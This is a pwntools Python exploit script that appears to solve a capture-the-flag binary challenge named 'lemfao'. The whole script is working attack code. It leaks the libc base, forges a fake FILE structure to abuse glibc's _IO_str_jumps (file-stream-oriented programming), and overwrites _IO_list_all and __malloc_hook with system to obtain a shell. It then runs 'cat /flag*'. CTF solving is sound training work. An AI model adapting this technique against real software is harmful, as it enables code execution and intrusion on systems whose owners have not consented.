#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './lemfao'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '127.0.0.1', 10027

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x4008a3
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# https://ret2school.github.io/post/cheapie/
# https://faraz.faith/2020-10-13-FSOP-lazynote/
# https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

def exploit():
    global io
    io = initialize()

    io.recvuntil(b'0x')
    libc.address = int(io.recvline().strip(), 16) - libc.sym['malloc']

    bin_sh = next(libc.search(b"/bin/sh\x00"))
    _IO_str_jumps = libc.address + 0x3e8360 # _IO_str_overflow _IO_flush_all_lockp
    _IO_wide_data_1 = libc.address + 0x3eb8c0
    _IO_stdfile_1_lock = libc.address + 0x3ed8c0
    assert(bin_sh % 2 == 0)

    info('libc base: %#x', libc.address)
    info('_IO_list_all: %#x', libc.sym['_IO_list_all'])
    info('_IO_file_jumps: %#x', libc.sym['_IO_file_jumps'])
    info('_IO_str_jumps: %#x', _IO_str_jumps)
    info('_IO_wide_data_1: %#x', _IO_wide_data_1)
    info('_IO_stdfile_1_lock: %#x', _IO_stdfile_1_lock)

    # Create fake FILE (_IO_strfile)
    fake_file = p64(0xfbad2886)                
    fake_file += p64(libc.sym['_IO_2_1_stdout_']) * 0x3
    fake_file += p64(0)
    fake_file += p64( (bin_sh - 100) // 2 + 1)
    fake_file += p64(0)
    fake_file += p64(1)
    fake_file += p64( (bin_sh - 100) // 2  + 1)
    fake_file += p64(0) * 4
    fake_file += p64(libc.sym['_IO_2_1_stdin_'])
    fake_file += p32(1)
    fake_file += p32(0)
    fake_file += p64(0x3)
    fake_file += p16(0)
    fake_file += p8(0)
    fake_file += p8(0)
    fake_file += p32(0)
    fake_file += p64(_IO_stdfile_1_lock)
    fake_file += p64(0x2)
    fake_file += p64(0)
    fake_file += p64(_IO_wide_data_1)
    fake_file += p64(0) * 0x3
    fake_file += p32(0x0)
    fake_file += p8(0) * 20
    fake_file += p64(_IO_str_jumps)
    fake_file += p64(libc.sym['system'])
    fake_file += p64(libc.sym['_IO_2_1_stdout_'])

    io.sendlineafter(b'lemfao', fake_file)

    io.sendlineafter(b'hm', str(libc.sym['_IO_list_all']).encode())
    io.sendlineafter(b'huh', str(elf.sym['lemfao']).encode())

    io.sendlineafter(b'hm', str(libc.sym['__malloc_hook']).encode())
    io.sendlineafter(b'huh', str(libc.sym['system']).encode())

    io.sendline('ls')
    io.sendline('cat /flag*')

    io.interactive()
    
if __name__ == '__main__':
    exploit()